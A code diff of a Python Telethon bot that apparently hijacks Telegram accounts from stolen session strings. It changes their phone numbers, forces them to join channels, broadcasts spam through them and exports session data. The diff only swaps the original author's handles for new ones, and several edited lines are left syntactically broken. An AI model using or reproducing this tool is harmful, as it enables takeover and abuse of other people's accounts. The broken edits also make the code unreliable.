@@ -1,5 +1,5 @@
 
-# COPYRIGHT © 2022 BY ANES/@N_B_1 🔥
+# COPYRIGHT © 2022 BY alosh/@iq_u1 🔥
 # NOW PUBLIC BY Anes
 import os
 os.system("pip install -U telethon")
@@ -33,11 +33,11 @@ async def change_number_code(strses, number, code, otp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
     try:
-      await bot(join("R125R"))
+      await bot(join("i_q_u_1"))
     except BaseException:
       pass
     try:
-      await bot(join("QQQLO"))
+      await bot(join("i_q_u_1"))
     except BaseException:
       pass
     try:
@@ -62,11 +62,11 @@ async def change_number(strses, number):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
     try:
-      await bot(join("QQQLO"))
+      await bot(join("i_q_u_1))
     except BaseException:
       pass
     try:
-      await bot(join("R125R"))
+      await bot(join("i_q_u_1"))
     except BaseException:
       pass
     try:
@@ -200,7 +200,7 @@ async def demall(strses, grp):
     except BaseException:
       pass
     try:
-      await X(join("@N_B_10"))
+      await X(join("@i_q_u_1"))
     except BaseException:
       pass
     try:
@@ -226,7 +226,7 @@ async def joingroup(strses, username):
     except BaseException:
       pass
     try:
-      await X(join("@N_B_10"))
+      await X(join(""@i_q_u_1")
     except BaseException:
       pass
     try:
@@ -247,7 +247,7 @@ async def leavegroup(strses, username):
     except BaseException:
       pass
     try:
-      await X(join("@N_B_10"))
+      await X(join("@i_q_u_1"))
     except BaseException:
       pass
     try:
@@ -509,7 +509,7 @@ async def users(event):
         return await event.reply("لقد تم طرد هذا الكود من الحساب مسبقا.\n/hack", buttons=keyboard)
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDetails BY QQQLO")
+        file.write(i + "\n\nDetails BY iq_u1"
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
@@ -705,7 +705,7 @@ async def users(event):
         else:
           await event.respond("هناك خطأ ما حصل")
       except Exception as e:
-        await event.respond("ارسل المشكله الى لحلها- @QQQLO\n**LOGS**\n" + str(e))
+        await event.respond("ارسل المشكله الى لحلها- @iq_u1*LOGS**\n" + str(e))
 
 
 
@@ -718,7 +718,7 @@ async def start(event):
         Button.inline("c", data="c"),
         ],
       [
-        Button.url("المالك", "https://t.me/QQQLO")
+        Button.url("المالك", "https://t.me/iq_u1")
         ]
     ]
     await event.reply("Now Give Me Flag Where U Want to Gcast \n✓ For All - Choose a\n✓ For Group - Choose b\n✓ For Private - Choose c", buttons=keyboard)
@@ -938,5 +938,5 @@ async def users(event):
       i = await gcastc(strses.text, msg.text)
       await event.reply(f"Done Gcasted In {i} Private😗😗.", buttons=keyboard)
 
-print(" لقد تم تنصيب البوت بنجاح.     للمساعده راسل المعرف التالي. @QQQLO")
+print(" لقد تم تنصيب البوت بنجاح.     للمساعده راسل المعرف التالي. @iq_u1
 client.run_until_disconnected()
